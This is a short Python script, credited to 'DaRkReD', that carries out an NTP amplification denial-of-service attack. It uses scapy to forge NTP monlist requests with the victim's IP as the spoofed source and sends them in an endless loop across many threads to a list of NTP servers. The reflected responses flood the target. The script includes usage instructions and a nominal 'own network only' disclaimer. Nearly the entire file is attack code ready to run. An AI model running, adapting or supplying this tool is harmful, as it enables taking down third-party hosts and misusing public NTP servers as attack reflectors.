#/usr/bin/python
#NTP Amp DOS attack
#usage ntpdos.py <target ip> <ntpserver list> <number of threads> ex: ntpdos.py 1.2.3.4 file.txt 10
#FOR USE ON YOUR OWN NETWORK ONLY
from scapy.all import *
import sys
import threading
import time
#packet sender
def deny():
	#Import globals to function
	global ntplist
	global currentserver
	global data
	global target
	ntpserver = ntplist[currentserver] #Get new server
	currentserver = currentserver + 1 #Increment for next 
	packet = IP(dst=ntpserver,src=target)/UDP(sport=48947,dport=123)/Raw(load=data) #BUILD IT
	send(packet,loop=1) #SEND IT

#Fetch Args
target = sys.argv[1]

#Help out idiots
if target == "help":
	print "NTP Amplification DOS Attack"
	print "By DaRkReD"
	print "Usage ntpdos.py <target ip> <ntpserver list> <number of threads>"
	print "ex: ex: ntpdos.py 1.2.3.4 file.txt 10"
	print "NTP serverlist file should contain one IP per line"
	print "MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS"
	exit(0)
ntpserverfile = sys.argv[2]
numberthreads = sys.argv[3]

#System for accepting bulk input
ntplist = []
currentserver = 0
with open(ntpserverfile) as f:
    ntplist = f.readlines()

#Make sure we dont out of bounds
if len(ntplist) < numberthreads:
	print "Attack Aborted: More threads than servers"
	print "Next time dont create more threads than servers"
	exit(0)

#Magic Packet aka NTP v2 Monlist Packet
data=str("\x17\x00\x03\x2a") + str("\x00")*4

#Hold our threads
threads = []
print "Starting to flood: "+ target + " using NTP list: " + ntpserverfile + " With " + numberthreads + " threads"
print "Use CTRL+C to stop attack"

#Thread spawner
for n in range(numberthreads):
    thread = threading.Thread(target=deny)
    thread.daemon = True
    thread.start()

    threads.append(thread)

#In progress!
print "Sending..."

#Keep alive so ctrl+c still kills all them threads
while True:
	time.sleep(1)